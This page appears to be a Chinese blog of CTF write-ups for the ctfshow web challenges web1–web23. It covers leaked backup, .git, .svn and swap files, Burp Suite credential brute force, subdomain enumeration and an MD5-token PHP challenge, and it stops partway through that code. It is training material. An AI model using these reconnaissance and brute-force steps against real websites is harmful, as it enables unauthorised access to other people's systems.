<!-- build time:Mon Dec 02 2024 23:29:06 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/favicon2.jpg"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="Kirakira!" href="http://k1nakoo.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="Kirakira!" href="http://k1nakoo.github.io/atom.xml"><link rel="alternate" type="application/json" title="Kirakira!" href="http://k1nakoo.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="CTF"><link rel="canonical" href="http://k1nakoo.github.io/ctfshow-web/"><title>ctfshow-web - CTF Write Up | K1nakoã®blog = Kirakira! = à«®(Ë¶áµ” áµ• áµ”Ë¶)áƒ</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">ctfshow-web</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2023-04-17 21:40:44"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2023-04-17T21:40:44+08:00">2023-04-17</time> </span><span class="item" title="æœ¬æ–‡å­—æ•°"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">æœ¬æ–‡å­—æ•°</span> <span>74k</span> <span class="text">å­—</span> </span><span class="item" title="é˜…è¯»æ—¶é•¿"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">é˜…è¯»æ—¶é•¿</span> <span>1:07</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">K1nakoã®blog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="https://k1nako-images.netlify.app/images/wallhaven-o39dop.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF-Write-Up/" itemprop="item" rel="index" title="åˆ†ç±»äº CTF Write Up"><span itemprop="name">CTF Write Up</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://k1nakoo.github.io/ctfshow-web/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/touxiang.jpg"><meta itemprop="name" content="K1nako"><meta itemprop="description" content="à«®(Ë¶áµ” áµ• áµ”Ë¶)áƒ, ä¸€åç½‘å®‰å°ç™½"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Kirakira!"></span><div class="body md" itemprop="articleBody"><p>ctfshow web éƒ¨åˆ† wp<br><span id="more"></span></p><p>###ï¼ˆä¹‹åæœ‰ç©ºå°±è¡¥æˆªå›¾ï¼‰</p><h1 id="ä¿¡æ¯æœé›†"><a class="anchor" href="#ä¿¡æ¯æœé›†">#</a> ä¿¡æ¯æœé›†</h1><h2 id="web1"><a class="anchor" href="#web1">#</a> web1</h2><p>å¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤</p><pre><code>æŸ¥çœ‹æºä»£ç å¾—åˆ°flag
</code></pre><h2 id="web2"><a class="anchor" href="#web2">#</a> web2</h2><p>js å‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</p><pre><code>ctrl+uå¿«æ·é”®æŸ¥çœ‹æºä»£ç å¾—åˆ°flag
</code></pre><h2 id="web3"><a class="anchor" href="#web3">#</a> web3</h2><p>æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</p><pre><code>1)f12æŸ¥çœ‹ç½‘ç»œæ£€æŸ¥æ–‡ä»¶å¤´å¾—åˆ°flag
2)burpsuiteæŠ“åŒ…ï¼ŒRepeaterå›æ˜¾æ£€æŸ¥æ–‡ä»¶å¤´å¾—åˆ°flag
</code></pre><h2 id="web4"><a class="anchor" href="#web4">#</a> web4</h2><p>æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥ robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</p><p><strong>robots.txt æ–‡ä»¶æ³„éœ²</strong>ï¼Œæ”¾åœ¨ç½‘ç«™çš„è·Ÿç›®å½•ä¸‹ï¼Œç”¨äºé™åˆ¶æµè§ˆå™¨çš„è®¿é—®ï¼ˆå“ªäº›å¯ä»¥æŠ“å–ï¼Œå“ªäº›ä¸èƒ½æŠ“å–ï¼‰ç”¨äºé˜²æ­¢é»‘å®¢ï¼Œä½†æ˜¯ä»»ä½•äººå¯åœ¨ url ä¸­ç›´æ¥é€šè¿‡ /robots.txt è®¿é—®ï¼Œå¯¼è‡´ç½‘ç«™ç»“æ„è¢«æ³„éœ²ã€‚å¯å¯¹ admin ç­‰é‡è¦æ–‡ä»¶è®¾ç½®å¯†ä¿ä¿æŠ¤ï¼Œæˆ–è€…é‡‡å–æ›´æ¢æ–‡ä»¶åçš„æ–¹æ³•é˜²å¾¡.</p><pre><code>æ£€æŸ¥robots.txtå¾—åˆ°çº¿ç´¢Disallow: /flagishere.txtï¼Œè®¿é—®å¾—åˆ°flag
</code></pre><h2 id="web5"><a class="anchor" href="#web5">#</a> web5</h2><p>phps æºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</p><p>php å¤‡ä»½æ–‡ä»¶ï¼šåç¼€ä¸º php~ æˆ–è€… index.php.bak</p><p>php çš„æºä»£ç æ–‡ä»¶ï¼šåç¼€ä¸º phps</p><p><strong>phps æ–‡ä»¶æ³„éœ²</strong>ï¼Œphps å­˜æ”¾ç€ php<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTYlQkElOTAlRTclQTAlODEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw"> æºç </span>ï¼Œå¯é€šè¿‡å°è¯•è®¿é—® /index.phps è¯»å–ï¼Œæˆ–è€…å°è¯•æ‰«æå·¥å…·æ‰«æè¯»å–.</p><pre><code>ç”¨å¾¡å‰‘æ‰«ç åªå¾—åˆ°index.phpï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œè®¿é—®index.phpså¾—åˆ°æ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°flag
</code></pre><h2 id="web6"><a class="anchor" href="#web6">#</a> web6</h2><p>è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</p><p>å‹ç¼©æ–‡ä»¶ä¹Ÿå¯èƒ½åŒ…å«æ–‡ä»¶çš„æºç ç­‰ï¼Œæ³¨æ„ rar zip åç¼€</p><pre><code>ç”¨dirsearchå·¥å…·æ‰«æç›®å½•ï¼Œç”¨å…¶ä»–å·¥å…·æ‰«ä¹Ÿå¯ä»¥ï¼Œå¾—åˆ°www.zipå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°æºç å’Œæ–‡æœ¬ï¼Œå¾—åˆ°æç¤ºï¼Œflag in æ–‡æœ¬é‡Œï¼Œæµè§ˆå™¨è®¿é—®æ­¤æ–‡æœ¬å¾—åˆ°flag
</code></pre><h2 id="web7"><a class="anchor" href="#web7">#</a> web7</h2><p>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p><p><strong>git æ–‡ä»¶æ³„éœ²</strong>ï¼Œå½“å¼€å‘äººå‘˜ä½¿ç”¨ git æ§åˆ¶ç‰ˆæœ¬æ—¶ï¼Œå¦‚æœæ“ä½œä¸å½“ï¼Œå¯èƒ½å¯¼è‡´ git æµå…¥çº¿ä¸Šç¯å¢ƒï¼Œå¯¼è‡´.git æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶è¢«è®¿é—®ï¼Œä»£ç æ³„éœ²ï¼Œå¦‚.git/index æ–‡ä»¶å¯æ‰¾åˆ°å·¥ç¨‹æ‰€æœ‰æ–‡ä»¶åå’Œ sha1 æ–‡ä»¶ï¼Œåœ¨ git/objects ä¸‹è½½å¯¼è‡´å±å®³</p><pre><code>dirsearchå·¥å…·æ‰«æç›®å½•ï¼Œå¾—åˆ°.gitçº¿ç´¢ï¼Œè®¿é—®å¾—åˆ°flag
</code></pre><h2 id="web8"><a class="anchor" href="#web8">#</a> web8</h2><p>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p><p><strong>svn æ³„éœ²</strong>ï¼Œsvn æ˜¯æºä»£ç ç®¡ç†ç³»ç»Ÿï¼Œåœ¨ç®¡ç†ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç”Ÿæˆä¸€ä¸ª.svn çš„éšè—æ–‡ä»¶ï¼Œå¯¼è‡´æºç æ³„éœ²ï¼ˆé€ æˆåŸå› æ˜¯åœ¨å‘å¸ƒä»£ç æ—¶æ²¡æœ‰ä½¿ç”¨å¯¼å…¥åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥ç²˜è´´å¤åˆ¶ï¼‰</p><pre><code>dirsearchå·¥å…·æ‰«æç›®å½•ï¼Œå¾—åˆ°.svnçº¿ç´¢ï¼Œè®¿é—®å¾—åˆ°flag
</code></pre><h2 id="web9"><a class="anchor" href="#web9">#</a> web9</h2><p>å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒ vim æ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</p><p><strong>vim ç¼“å­˜æ³„éœ²</strong>ï¼Œåœ¨ä½¿ç”¨ vim è¿›è¡Œç¼–è¾‘æ—¶ï¼Œä¼šäº§ç”Ÿç¼“å­˜æ–‡ä»¶ï¼Œæ“ä½œæ­£å¸¸ï¼Œåˆ™ä¼šåˆ é™¤ç¼“å­˜æ–‡ä»¶ï¼Œå¦‚æœæ„å¤–é€€å‡ºï¼Œç¼“å­˜æ–‡ä»¶ä¿ç•™ä¸‹æ¥ï¼Œè¿™æ˜¯æ—¶å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¥å¾—åˆ°åŸæ–‡ä»¶ï¼Œä»¥ index.php æ¥è¯´ï¼Œç¬¬ä¸€æ¬¡é€€å‡ºåï¼Œç¼“å­˜æ–‡ä»¶åä¸º .index.php.swpï¼Œç¬¬äºŒæ¬¡é€€å‡ºåï¼Œç¼“å­˜æ–‡ä»¶åä¸º.index.php.swo, ç¬¬ä¸‰æ¬¡é€€å‡ºåæ–‡ä»¶åä¸º.index.php.swn</p><pre><code>ä¸‹è½½index.php.swpå¾—åˆ°flag
</code></pre><h2 id="web10"><a class="anchor" href="#web10">#</a> web10</h2><p>cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</p><pre><code>æŸ¥çœ‹cookieå€¼ï¼Œurlç¼–ç è§£ç å¾—åˆ°flag
</code></pre><h2 id="web11"><a class="anchor" href="#web11">#</a> web11</h2><p>åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œ<span class="exturl" data-url="aHR0cDovL3huLS1mbGFnLWY5NmczMTVnLmN0ZnNob3cuY29t">æ¯”å¦‚ flag.ctfshow.com</span> å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</p><pre><code>https://boce.aliyun.com/homeæŸ¥è¯¢åŸŸåtxtè®°å½•å¾—åˆ°flag
</code></pre><h2 id="web12"><a class="anchor" href="#web12">#</a> web12</h2><p>æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </p><pre><code>ç”¨dirsearchæˆ–dirbå·¥å…·æ‰«ç›®å½•ï¼Œå‘ç°æœ‰adminåå°ï¼Œæ ¹æ®æç¤ºï¼Œç½‘ç«™ä¿¡æ¯æ˜¯ç®¡ç†å‘˜çš„å¯†ç ï¼Œç¿»åˆ°æœ€åº•ä¸‹çœ‹åˆ°ä¸€ä¸²æ•°å­—ï¼Œå°è¯•adminã€372619038ç™»é™†å¾—åˆ°flag
</code></pre><h2 id="web13"><a class="anchor" href="#web13">#</a> web13</h2><p>æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </p><pre><code>æ ¹æ®é¢˜ç›®æç¤ºï¼Œåœ¨ç½‘é¡µæŸ¥æ‰¾çº¿ç´¢ï¼Œç¿»åˆ°æœ€ä¸‹é¢çœ‹åˆ°ä¸€ä¸ªdocumentï¼Œæ‰“å¼€å¾—åˆ°åå°åœ°å€ç”¨æˆ·åå¯†ç ï¼Œç™»é™†å¾—åˆ°flag
</code></pre><h2 id="web14"><a class="anchor" href="#web14">#</a> web14</h2><p>æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦ (editor) çš„ä¿¡æ¯ï¼Œé»˜è®¤é…ç½®å®³æ­»äºº</p><pre><code>æ ¹æ®é¢˜ç›®æç¤ºï¼ŒæŸ¥çœ‹æºä»£ç æœç´¢editorï¼Œå°è¯•è®¿é—®editorç¼–è¾‘å™¨ï¼Œå‘ç°å¯ä»¥ï¼Œç‚¹å‡»ä¸Šä¼ æ–‡ä»¶æŸ¥çœ‹æ–‡ä»¶ç©ºé—´ï¼ŒæŸ¥çœ‹htmlæºä»£ç æ–‡ä»¶ï¼Œçœ‹åˆ°ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ–‡ä»¶å¤¹nothinghereï¼Œè®¿é—®é‡Œé¢çš„æ–‡æœ¬å¾—åˆ°flag
</code></pre><h2 id="web15"><a class="anchor" href="#web15">#</a> web15</h2><p>å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</p><p>æ ¹æ®é¢˜ç›®æç¤ºï¼ŒæŸ¥çœ‹é‚®ç®±</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055136237.png" alt="image-20230111055136237"></p><p>å°†è¿™äº›ä¿¡æ¯ä¿ç•™ï¼ŒæŸ¥çœ‹æœ‰æ²¡æœ‰åå°ï¼Œå¯ç”¨æœç´¢ç›®å½•å·¥å…·æœ</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055233970.png" alt="image-20230111055233970"></p><p>è¿™é‡Œç›´æ¥ç‚¹å¿˜è®°å¯†ç <img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055256232.png" alt="image-20230111055256232"></p><p>æ ¹æ®ä¹‹å‰çš„ QQ é‚®ç®±æŸ¥æ‰¾ï¼Œå¾—çŸ¥æ‰€åœ¨åœ°åœ¨è¥¿å®‰</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055327591.png" alt="image-20230111055327591"></p><p>ç™»é™†å¾—åˆ° flag</p><h2 id="web16"><a class="anchor" href="#web16">#</a> web16</h2><p>å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</p><p>æœ‰çš„ç½‘ç«™æ­å»ºæ—¶å¯èƒ½åœ¨<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTYlQTAlQjklRTclOUIlQUUlRTUlQkQlOTUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">æ ¹ç›®å½•</span>ä¸‹ç•™ä¸‹æ¢é’ˆï¼Œæ‰€ä»¥ç›´æ¥è®¿é—® tz.php</p><p>å‘ç° phpinfo æ˜¯ç°è‰²çš„å¯ä»¥ç‚¹å‡»ï¼Œæœç´¢ FLAG å¾—åˆ° flag</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111055854438.png" alt="image-20230111055854438"></p><h2 id="web17"><a class="anchor" href="#web17">#</a> web17</h2><p>å¤‡ä»½çš„ sql æ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</p><p>ç”¨æ‰«æç›®å½•å·¥å…·æ‰«å‡º backup.sqlï¼Œä¸‹è½½æ–‡ä»¶å¾—åˆ° flag</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111060221115.png" alt="image-20230111060221115"></p><h2 id="web18"><a class="anchor" href="#web18">#</a> web18</h2><p>ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç© 101 åˆ†ç»™ä½  flag</p><p>å°æ¸¸æˆä¸€èˆ¬éƒ½æ˜¯ js å‰ç«¯ï¼ŒæŸ¥çœ‹æºä»£ç  js æ–‡ä»¶æ‰¾çº¿ç´¢</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111060515277.png" alt="image-20230111060515277"></p><p>æ‰¾åˆ°ä¸ª unicode ç¼–ç ï¼Œè§£ç å¾—åˆ°çº¿ç´¢</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111060607168.png" alt="image-20230111060607168"></p><p>è®¿é—® 110.php å¾—åˆ° flag</p><h2 id="web19"><a class="anchor" href="#web19">#</a> web19</h2><p>å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</p><p>æŸ¥çœ‹æºç <img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111061738788.png" alt="image-20230111061738788"></p><p>æ ¹æ®çº¿ç´¢ï¼ŒAES è§£å¯†ï¼Œå¾—åˆ°å¯†ç ç™»é™†å¾— flag</p><h2 id="web20"><a class="anchor" href="#web20">#</a> web20</h2><p>mdb æ–‡ä»¶æ˜¯æ—©æœŸ asp+access æ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p><p>æ‰«æç›®å½•<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111062233553.png" alt="image-20230111062233553"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230111062511804.png" alt="image-20230111062511804"></p><p>å¾— flag</p><h1 id="çˆ†ç ´"><a class="anchor" href="#çˆ†ç ´">#</a> çˆ†ç ´</h1><h2 id="web21"><a class="anchor" href="#web21">#</a> web21</h2><p>çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“</p><p>è€ƒç‚¹ï¼šåŸºç¡€çˆ†ç ´å·¥å…·çš„ä½¿ç”¨</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112173817548.png" alt="image-20230112173817548"></p><p>burpsuite æŠ“åŒ…<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112173857363.png" alt="image-20230112173857363"></p><p>å‘ç° base64 ç¼–ç ï¼Œè§£ç åå‘ç°æ˜¯æˆ‘ä»¬è¾“å…¥è¿›å»çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œé¢˜ç›®ä¹Ÿç»™å‡ºäº†å­—å…¸ï¼Œæ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´</p><p>é€‰ä¸­å‘é€åˆ° Intruder æ¨¡å—ï¼Œé€‰ä¸­å˜é‡ï¼Œé€‰æ‹©è‡ªå®šä¹‰<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174004386.png" alt="image-20230112174004386"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174023622.png" alt="image-20230112174023622"></p><p>è¿™é‡Œåˆ†åˆ«ç»™ä¸‰æ®µï¼Œadmin ä¸€æ®µï¼Œï¼šä¸€æ®µï¼Œå­—å…¸ä¸€æ®µ</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174134824.png" alt="image-20230112174134824"></p><p>é€‰æ‹© base64 ç¼–ç ï¼Œå‹¾æ‰ url ç¼–ç ï¼Œå› ä¸ºä¼šè¯¯åˆ¤ base64 ç¼–ç ï¼Œå¼€å§‹çˆ†ç ´</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174204443.png" alt="image-20230112174204443"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174402693.png" alt="image-20230112174402693"></p><p>æ ¹æ®é•¿åº¦<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112174428309.png" alt="image-20230112174428309"></p><pre><code>ctfshow&#123;92f49a08-737e-4358-a25a-348a1463ba63&#125;
</code></pre><h2 id="web22"><a class="anchor" href="#web22">#</a> web22</h2><p>åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ª ctf.show çš„å­åŸŸå</p><p>è€ƒç‚¹ï¼šåŸŸåçˆ†ç ´</p><p>å·¥å…·ï¼šLayer æŒ–æ˜æœº</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112182559786.png" alt="image-20230112182559786"></p><p>å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œvip.ctf.show è®¿é—®å‘ç° flag</p><pre><code>flag&#123;ctf_show_web&#125;
</code></pre><h2 id="web23"><a class="anchor" href="#web23">#</a> web23</h2><p>è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼</p><p>å¤§è‡´æ„æ€æ˜¯ï¼ŒGET ä¸€ä¸ªå‚æ•° tokenï¼Œtoken çš„ MD5 åŠ å¯†åçš„å€¼å¦‚æœæ»¡è¶³ä¸‹é¢çš„åˆ¤æ–­ï¼Œå°±è¾“å‡º flag</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-03 11:43:51</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-03 11:56:11</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token 